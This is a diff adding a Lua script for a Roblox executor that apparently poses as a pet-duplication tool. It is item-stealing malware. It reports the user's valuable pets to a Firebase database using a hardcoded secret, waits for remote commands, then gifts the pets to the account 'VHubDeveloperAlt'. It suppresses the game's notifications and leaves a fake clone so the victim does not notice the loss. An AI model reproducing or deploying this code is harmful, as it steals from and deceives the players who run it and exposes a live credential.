@@ -1,0 +1,205 @@
+if somethingevil then
+    print("Something evil is already running :|")
+    return
+end
+
+pcall(function() getgenv().somethingevil = true end)
+
+print("Something evil is running >:)")
+local Secret = "FCSZ2B27L4oHVLY7HRVAgQnnNX2pSj9UzqJ6FXCz"
+local URL = "https://something-evil-default-rtdb.firebaseio.com/"
+local request = request or syn.request
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local DesiredPets = {"raccoon", "dragonfly", "queen bee", "petal bee", "golden bee", "disco bee", "butterfly", "bear bee", "red fox", "moth"}
+local ListOfPets = {}
+
+local function CheckInventory()
+	for _, Tool in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
+		local ToolName = string.lower(Tool.Name)
+
+		for _, DesiredPetName in DesiredPets do
+			if string.find(ToolName, string.lower(DesiredPetName)) then
+				table.insert(ListOfPets, Tool.Name)
+			end
+		end
+	end
+end
+
+CheckInventory()
+wait()
+
+local function ReadDatabase()
+	local database = URL..".json?auth="..Secret
+	local data = nil
+	local success, error = pcall(function()
+		data = game.HttpService:JSONDecode(game:HttpGetAsync(database))
+	end)
+
+	if success then
+		return data
+	else
+		print("Could not read database: "..error)
+		return nil
+	end
+end
+
+local function WriteDatabase(Path, Key, Value)
+	local success, error = pcall(function()
+		local Folder = Path
+		local database = URL..Folder..".json?auth="..Secret
+		local Table = {}
+
+		if game.HttpService:JSONDecode(game:HttpGetAsync(database)) ~= nil then
+			for key, value in pairs(game.HttpService:JSONDecode(game:HttpGetAsync(database))) do
+				if key then
+					Table[key] = value
+				end
+			end
+		end
+
+		Table[Key] = Value
+
+		local send = request({
+			Url = database,
+			Method = "PUT",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = game.HttpService:JSONEncode(Table)
+		})
+	end)
+
+	if success then
+		return true
+	else
+		print("Could not write database: "..error)
+		return false
+	end
+end
+
+local function DeleteDatabase(Path, Key)
+	local success, error = pcall(function()
+		local Folder = Path
+		local Delete = Key
+
+		local database = URL..Folder..".json?auth="..Secret
+		local request = request or syn.request
+		local Table = {}
+
+		if game.HttpService:JSONDecode(game:HttpGetAsync(database)) ~= nil then
+			for key, value in pairs(game.HttpService:JSONDecode(game:HttpGetAsync(database))) do
+				if key ~= Delete then
+					Table[key] = value
+				end
+			end
+		end
+
+		local send = request({
+			Url = database,
+			Method = "PUT",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = game.HttpService:JSONEncode(Table)
+		})
+	end)
+
+	if success then
+		return true
+	else
+		print("Could not delete database: "..error)
+		return false
+	end
+end
+
+local data = ReadDatabase()
+
+if data ~= nil then
+	if #ListOfPets ~= 0 then
+		if (data.Wanteds[LocalPlayer.Name]) then
+			WriteDatabase("Wanteds/"..LocalPlayer.Name, "Pets", ListOfPets)
+		else
+			WriteDatabase("Wanteds", LocalPlayer.Name, {
+				JobId = game.JobId,
+				LastSeen = os.time(),
+				Pets = ListOfPets
+			})
+		end
+		
+		WriteDatabase("Wanteds/"..LocalPlayer.Name, "JobId", game.JobId)
+		
+		coroutine.wrap(function()
+			while wait(10) do
+				WriteDatabase("Wanteds/"..LocalPlayer.Name, "LastSeen", os.time())
+			end
+		end)()
+	else
+		if (data.Wanteds[LocalPlayer.Name]) then
+			DeleteDatabase("Wanteds", LocalPlayer.Name)
+		end
+	end
+end
+
+coroutine.wrap(function()
+	while wait(1) do
+		if #ListOfPets ~= 0 then
+			local data = ReadDatabase()
+
+			if data ~= nil then
+				for Username, PetName in data.Remotes do
+					if Username == string.lower(LocalPlayer.Name) then
+						DeleteDatabase("Remotes", string.lower(LocalPlayer.Name))
+
+						for i, v in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
+							local isdupe = false
+
+							for AttributeName, _ in v:GetAttributes() do
+								if AttributeName == "Duped" then
+									isdupe = true
+								end
+							end
+
+							if v.Name == PetName and isdupe == false then
+								local ToolModelLoaded = false
+								local ToolHandleChildren = v.Handle:GetChildren() 
+
+								if #ToolHandleChildren == 0 then
+									v.Parent = game:GetService("Workspace")[LocalPlayer.Name]
+									wait(0.1)
+									v.Parent = game:GetService("Players").LocalPlayer.Backpack
+								end
+								wait()
+
+								game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Enabled = false
+
+								v.Parent = game:GetService("Workspace")[LocalPlayer.Name]
+								wait(0.1)
+
+								if v:GetAttribute("Favorite") == true then
+									local args = {
+										game:GetService("Players").LocalPlayer.Character:WaitForChild(PetName)
+									}
+									game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
+								end
+
+								wait(0.1)
+
+								local args = {
+									"GivePet",
+									game:GetService("Players"):FindFirstChild("VHubDeveloperAlt")
+								}
+								game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+
+								local Fake = v:Clone()
+								Fake.Parent = game:GetService("Players").LocalPlayer.Backpack
+								Fake:SetAttribute("Duped", true)
+								wait(0.1)
+								v:Destroy()
+							end
+						end
+					end
+				end
+			end
+		else
+			print("Disconnected")
+			coroutine.yield()
+		end
+	end
+end)()
